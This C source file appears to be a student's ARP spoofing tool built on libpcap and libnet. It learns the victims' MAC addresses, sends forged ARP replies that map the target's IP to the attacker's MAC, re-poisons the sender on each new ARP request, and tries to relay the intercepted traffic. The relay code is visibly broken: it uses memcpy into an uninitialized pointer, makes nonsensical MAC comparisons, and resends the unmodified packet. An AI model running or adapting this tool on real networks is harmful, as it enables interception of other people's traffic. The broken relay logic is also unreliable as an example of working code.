#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <net/ethernet.h>
#include <pcap/pcap.h>
#include <signal.h>
#include <errno.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <netinet/ether.h> 
#include <sys/ioctl.h>
#include <net/if.h>
#include <libnet.h>

struct ip *ip_header;
struct tcphdr *tcp_header;
struct arphdr *arp_header;

void dump(u_char* p, int len){
	for(int i=0; i<len; i++){
		printf("%02x ", *p);
		p++;
		if(i%16==15) printf("\n");
	}
	printf("\n");
}
int analysis(const u_char *p, int len, u_int8_t *mac){
	struct ether_header *e_header;
	int ether_type;
	
	e_header = (struct ether_header *)p;
	p += sizeof(struct ether_header);
	ether_type = ntohs(e_header->ether_type);
	
	if(ether_type != ETHERTYPE_ARP) return 0;
	printf("------Ether Header------\n");
	printf("Src Mac : ");
	printf("%02X", e_header->ether_shost[0]);
	for(int i=1; i<6; i++){
		printf(":%02X", e_header->ether_shost[i]);
	}
	for(int i=0; i<6; i++){
		mac[i] = e_header->ether_shost[i];
	}
	printf("\n");

	printf("Dst Mac : ");
	printf("%02X", e_header->ether_dhost[0]);
	for(int i=1; i<6; i++){
		printf(":%02X", e_header->ether_dhost[i]);
	}
	
	printf("\n");
	printf("----------------------\n");
	
	if(ether_type == ETHERTYPE_ARP){
		printf("------ARP Header------\n");
		arp_header = (struct arphdr *)p;
        
        if(ntohs(arp_header->ar_op) == ARPOP_REQUEST)
		printf("ARP request\n\n");    //Request
		else if(ntohs(arp_header->ar_op) == ARPOP_REPLY){ //Reply
			printf("ARP reply\n\n");
			return 1;
		}
		else if(ntohs(arp_header->ar_op) == ARPOP_RREQUEST)
		printf("RARP request\n\n");    //Reverse ARP request
		else if(ntohs(arp_header->ar_op) == ARPOP_RREPLY)
		printf("RARP reply\n\n");    //Reverse ARP reply
        printf("----------------------\n");
        return 0;
	}
}
int analysis2(const u_char *p, int len){
	struct ether_header *e_header;
	int ether_type;
	
	e_header = (struct ether_header *)p;
	p += sizeof(struct ether_header);
	ether_type = ntohs(e_header->ether_type);
	
	printf("------Ether Header------\n");
	printf("Src Mac : ");
	printf("%02X", e_header->ether_shost[0]);
	for(int i=1; i<6; i++){
		printf(":%02X", e_header->ether_shost[i]);
	}
	printf("\n");

	printf("Dst Mac : ");
	printf("%02X", e_header->ether_dhost[0]);
	for(int i=1; i<6; i++){
		printf(":%02X", e_header->ether_dhost[i]);
	}
	
	printf("\n");
	printf("----------------------\n");
	
	if(ether_type == ETHERTYPE_ARP){
		printf("------ARP Header------\n");
		arp_header = (struct arphdr *)p;
        
        if(ntohs(arp_header->ar_op) == ARPOP_REQUEST){
        	printf("ARP request\n\n");    //Request
        	return -1;
		}
		
		else if(ntohs(arp_header->ar_op) == ARPOP_REPLY){ //Reply
			printf("ARP reply\n\n");
			return 1;
		}
		else if(ntohs(arp_header->ar_op) == ARPOP_RREQUEST)
		printf("RARP request\n\n");    //Reverse ARP request
		else if(ntohs(arp_header->ar_op) == ARPOP_RREPLY)
		printf("RARP reply\n\n");    //Reverse ARP reply
        printf("----------------------\n");
        return 0;
	}
	else if(ether_type == ETHERTYPE_IP){
		printf("------IP Header------\n");
		ip_header = (struct ip *)p;
		printf("Src Address : %s\n", inet_ntoa(ip_header->ip_src));
        printf("Dst Address : %s\n", inet_ntoa(ip_header->ip_dst));
        printf("----------------------\n");
        if(ip_header -> ip_p == IPPROTO_TCP){
        	printf("------TCP Header------\n");
        	tcp_header = (struct tcphdr *)(p + ip_header->ip_hl * 4);
            printf("Src Port : %d\n" , ntohs(tcp_header->source));
            printf("Dst Port : %d\n" , ntohs(tcp_header->dest));
            
			int i=0;
            int offset = ip_header->ip_hl+tcp_header->th_off;
            int length = len - sizeof(struct ether_header) - offset*4;
            p += offset*4;
			while(length-- && i<16){
	            printf("%02x ", *(p++)); 
	            if ((++i % 16) == 0) 
	                printf("\n");
	        }
		}
		return 2;
	}
}
void usage() {
  printf("syntax: pcap_test <interface>\n");
  printf("sample: pcap_test wlan0\n");
}
int main(int argc, char* argv[]) {
  uint8_t *sender_ip = (uint8_t *)malloc(4);
  uint8_t *target_ip = (uint8_t *)malloc(4);
  u_int32_t attacker_ip;
  sscanf(argv[2], "%d.%d.%d.%d", &sender_ip[0], &sender_ip[1], &sender_ip[2], &sender_ip[3]);
  sscanf(argv[3], "%d.%d.%d.%d", &target_ip[0], &target_ip[1], &target_ip[2], &target_ip[3]);
  char* dev = argv[1];
  char errbuf2[PCAP_ERRBUF_SIZE];
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf2);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf2);
    return -1;
  }
  libnet_t *l;
  libnet_ptag_t t;
  char errbuf1[LIBNET_ERRBUF_SIZE];
  libnet_ether_addr* attacker_mac;	
  u_char broadcast_mac[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
  u_int8_t sender_mac[6];
  u_int8_t target_mac[6];
  u_int8_t *packet;
  u_int32_t packet_s;


   l = libnet_init(
            LIBNET_LINK_ADV,              //injection type 
            dev,                       //network interface
            errbuf1);
  if (l == NULL)
  {
  	fprintf(stderr, "%s", errbuf1);
  	return -1;
  }
  attacker_ip = libnet_get_ipaddr4(l);
  attacker_mac = libnet_get_hwaddr(l);
  t = libnet_autobuild_arp(
            ARPOP_REQUEST,              	// operation type
            attacker_mac->ether_addr_octet, // sender hardware addr 
            (u_int8_t *)&attacker_ip,           	// sender protocol addr 
            broadcast_mac,        	        // target hardware addr 
            sender_ip,           	// target protocol addr 
            l);                       		// libnet context 
  if (t == -1)
  {
        fprintf(stderr, "Can't build ARP header: %s\n", libnet_geterror(l));
        return -1;
  }
  t = libnet_autobuild_ethernet(
    broadcast_mac,                    // ethernet destination
    ETHERTYPE_ARP,                    // protocol type
    l);                               // libnet handle 
  if (t == -1)
  {
  	fprintf(stderr, "Can't build ethernet header: %s\n",
  	libnet_geterror(l));
    return -1;
  }
  if (libnet_adv_cull_packet(l, &packet, &packet_s) == -1){
  	fprintf(stderr, "%s", libnet_geterror(l));
  }
  else{
  	fprintf(stderr, "packet size: %d\n", packet_s);
  	libnet_adv_free_packet(l, packet);
  }
  int c = libnet_write(l);
  if (c == -1){
    fprintf(stderr, "Write error: %s\n", libnet_geterror(l));
    return -1;
  }
 libnet_destroy(l);
 int check2 = 0;
  while (true) {
  	int check = 0;
  	
	printf("\n");
    struct pcap_pkthdr* header;
    const u_char* packet1;
    int res = pcap_next_ex(handle, &header, &packet1);
    if (res == 0) continue;
    if (res == -1 || res == -2) break;
    printf("%u bytes captured\n", header->caplen);
    //dump((u_char*)packet, header->caplen);
    if(check2 == 0){
    	check = analysis((u_char*)packet1, header->caplen, sender_mac);
		printf("\n");
		printf("check : %d   check2 : %d\n", check, check2);
		if(check==1){
			check2 = 1;
				l = libnet_init(
		            LIBNET_LINK_ADV,              //injection type 
		            dev,                       //network interface
		            errbuf1);
		  if (l == NULL)
		  {
		     fprintf(stderr, "%s", errbuf1);
		     return -1;
		  }
		  u_char sender_mac2[6] = {sender_mac[0], sender_mac[1], sender_mac[2], sender_mac[3], sender_mac[4], sender_mac[5]};
		  t = libnet_autobuild_arp(
		            ARPOP_REPLY,                    // operation type
		            attacker_mac->ether_addr_octet, 					// sender hardware addr 
		            target_ip,         // sender protocol addr 
		            sender_mac2, 				 	// target hardware addr 
		            sender_ip,         // target protocol addr 
		            l);                             // libnet context 
		  if (t == -1)
		  {
		        fprintf(stderr, "Can't build ARP header: %s\n", libnet_geterror(l));
		        return -1;
		  }
		  t = libnet_autobuild_ethernet(
		    sender_mac2,   // ethernet destination
		    ETHERTYPE_ARP,                    // protocol type
		    l);                               // libnet handle 
		  if (t == -1)
		  {
		     fprintf(stderr, "Can't build ethernet header: %s\n",
		     libnet_geterror(l));
		    return -1;
		  }
		  if (libnet_adv_cull_packet(l, &packet, &packet_s) == -1){
		     fprintf(stderr, "%s", libnet_geterror(l));
		  }
		  else{
		     fprintf(stderr, "packet size: %d\n", packet_s);
		     libnet_adv_free_packet(l, packet);
		  }
		  c = libnet_write(l);
		  if (c == -1){
		    fprintf(stderr, "Write error: %s\n", libnet_geterror(l));
		    return -1;
		  }
		 libnet_destroy(l);
		 
		 l = libnet_init(
            LIBNET_LINK_ADV,              //injection type 
            dev,                       //network interface
            errbuf1);
		  if (l == NULL)
		  {
		  	fprintf(stderr, "%s", errbuf1);
		  	return -1;
		  }
		  attacker_ip = libnet_get_ipaddr4(l);
		  attacker_mac = libnet_get_hwaddr(l);
		  t = libnet_autobuild_arp(
		            ARPOP_REQUEST,              	// operation type
		            attacker_mac->ether_addr_octet, // sender hardware addr 
		            (u_int8_t *)&attacker_ip,           	// sender protocol addr 
		            broadcast_mac,        	        // target hardware addr 
		            target_ip,           	// target protocol addr 
		            l);                       		// libnet context 
		  if (t == -1)
		  {
		        fprintf(stderr, "Can't build ARP header: %s\n", libnet_geterror(l));
		        return -1;
		  }
		  t = libnet_autobuild_ethernet(
		    broadcast_mac,                    // ethernet destination
		    ETHERTYPE_ARP,                    // protocol type
		    l);                               // libnet handle 
		  if (t == -1)
		  {
		  	fprintf(stderr, "Can't build ethernet header: %s\n",
		  	libnet_geterror(l));
		    return -1;
		  }
		  if (libnet_adv_cull_packet(l, &packet, &packet_s) == -1){
		  	fprintf(stderr, "%s", libnet_geterror(l));
		  }
		  else{
		  	fprintf(stderr, "packet size: %d\n", packet_s);
		  	libnet_adv_free_packet(l, packet);
		  }
		  int c = libnet_write(l);
		  if (c == -1){
		    fprintf(stderr, "Write error: %s\n", libnet_geterror(l));
		    return -1;
		  }
		 libnet_destroy(l);
		}
	}
	else if(check2 == 1){
		check = analysis((u_char*)packet1, header->caplen, target_mac);
		printf("\n");
		printf("check : %d   check2 : %d\n", check, check2);
		if(check == 1){
			check2 = 2;
		}	
	}
	else if(check2 == 2){
		check = analysis2((u_char*)packet1, header->caplen);
		printf("\n");
		printf("check : %d   check2 : %d\n", check, check2);
		if(check==-1){
			l = libnet_init(
	            LIBNET_LINK_ADV,              //injection type 
	            dev,                       //network interface
	            errbuf1);
		  if (l == NULL)
		  {
		     fprintf(stderr, "%s", errbuf1);
		     return -1;
		  }
		  u_char sender_mac2[6] = {sender_mac[0], sender_mac[1], sender_mac[2], sender_mac[3], sender_mac[4], sender_mac[5]};
		  t = libnet_autobuild_arp(
		            ARPOP_REPLY,                    // operation type
		            attacker_mac->ether_addr_octet, 					// sender hardware addr 
		            target_ip,         // sender protocol addr 
		            sender_mac2, 				 	// target hardware addr 
		            sender_ip,         // target protocol addr 
		            l);                             // libnet context 
		  if (t == -1)
		  {
		        fprintf(stderr, "Can't build ARP header: %s\n", libnet_geterror(l));
		        return -1;
		  }
		  t = libnet_autobuild_ethernet(
		    sender_mac2,   // ethernet destination
		    ETHERTYPE_ARP,                    // protocol type
		    l);                               // libnet handle 
		  if (t == -1)
		  {
		     fprintf(stderr, "Can't build ethernet header: %s\n",
		     libnet_geterror(l));
		    return -1;
		  }
		  if (libnet_adv_cull_packet(l, &packet, &packet_s) == -1){
		     fprintf(stderr, "%s", libnet_geterror(l));
		  }
		  else{
		     fprintf(stderr, "packet size: %d\n", packet_s);
		     libnet_adv_free_packet(l, packet);
		  }
		  c = libnet_write(l);
		  if (c == -1){
		    fprintf(stderr, "Write error: %s\n", libnet_geterror(l));
		    return -1;
		  }
		 libnet_destroy(l);
		}
		else if(check == 2){
			if(packet1[3]==(sender_mac[0]*16+sender_mac[1]) && packet1[4]==(sender_mac[2]*16+sender_mac[3]) && packet1[5]==(sender_mac[4]*16+sender_mac[5])){
				u_char* new_packet;
				memcpy(new_packet, packet1, header->caplen);
				for(int i=0;i<3;i++){
					new_packet[i+3]=new_packet[i];
					new_packet[i]=target_mac[2*i]*16+target_mac[2*i+1];
				}
				pcap_sendpacket(handle, packet1, header->caplen);
				dump((u_char*)new_packet, header->caplen);
			} 
		}
	}
  }
  
  pcap_close(handle);
}
